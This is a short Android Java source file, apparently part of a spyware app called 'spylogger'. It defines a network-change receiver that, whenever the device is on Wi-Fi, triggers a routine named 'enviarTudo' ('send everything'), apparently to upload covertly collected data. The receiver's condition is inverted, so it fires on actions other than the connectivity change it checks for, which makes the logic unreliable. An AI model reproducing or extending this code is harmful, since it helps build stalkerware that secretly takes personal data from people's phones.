package com.gravatasufoca.spylogger.receivers;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;

import com.gravatasufoca.spylogger.helpers.NetworkUtil;
import com.gravatasufoca.spylogger.utils.Utils;

public class NetworkChangeReceiver extends BroadcastReceiver {

    @Override
    public void onReceive(final Context context, final Intent intent) {


        if (!"android.net.conn.CONNECTIVITY_CHANGE".equals(intent.getAction())) {
            if (NetworkUtil.isWifi(context))
                Utils.enviarTudo(context);
        }

    }
}